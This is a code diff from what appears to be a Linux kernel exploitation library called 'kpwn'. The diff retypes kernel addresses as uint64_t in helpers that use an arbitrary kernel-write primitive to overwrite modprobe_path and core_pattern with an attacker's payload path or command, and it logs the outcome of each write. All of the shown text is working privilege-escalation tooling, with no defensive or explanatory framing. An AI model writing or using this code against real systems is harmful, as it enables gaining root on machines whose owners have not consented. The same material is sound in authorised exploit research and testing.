@@ -10,18 +10,18 @@
 #include <sys/wait.h>
 #include <unistd.h>
 
-int kpwn_overwrite_modprobe(void *kbase, size_t modprobe_path_off,
+int kpwn_overwrite_modprobe(uint64_t kbase, size_t modprobe_path_off,
                             const char *payload_path, kpwn_kwrite_fn write_fn,
                             void *ctx) {
   ASSERT_MSG(payload_path != NULL, "payload_path is NULL");
   size_t len = strlen(payload_path) + 1;
   ASSERT_MSG(len <= 256, "payload_path too long (max 256)");
 
-  void *target = (char *)kbase + modprobe_path_off;
+  uint64_t target = kbase + modprobe_path_off;
   int ret = write_fn(target, payload_path, len, ctx);
 
   if (ret == 0)
-    log_success("[kpwn:overwrite] modprobe_path=%s target=%p", payload_path,
+    log_success("[kpwn:overwrite] modprobe_path=%s target=0x%lx", payload_path,
                 target);
   else
     log_error("[kpwn:overwrite] modprobe_path write failed");
@@ -47,18 +47,18 @@ int kpwn_trigger_modprobe(const char *dummy_path) {
   return 0;
 }
 
-int kpwn_overwrite_core_pattern(void *kbase, size_t core_pattern_off,
+int kpwn_overwrite_core_pattern(uint64_t kbase, size_t core_pattern_off,
                                 const char *payload_cmd,
                                 kpwn_kwrite_fn write_fn, void *ctx) {
   ASSERT_MSG(payload_cmd != NULL, "payload_cmd is NULL");
   size_t len = strlen(payload_cmd) + 1;
   ASSERT_MSG(len <= 128, "core_pattern payload too long (max 128)");
 
-  void *target = (char *)kbase + core_pattern_off;
+  uint64_t target = kbase + core_pattern_off;
   int ret = write_fn(target, payload_cmd, len, ctx);
 
   if (ret == 0)
-    log_success("[kpwn:overwrite] core_pattern=%s target=%p", payload_cmd,
+    log_success("[kpwn:overwrite] core_pattern=%s target=0x%lx", payload_cmd,
                 target);
   else
     log_error("[kpwn:overwrite] core_pattern write failed");
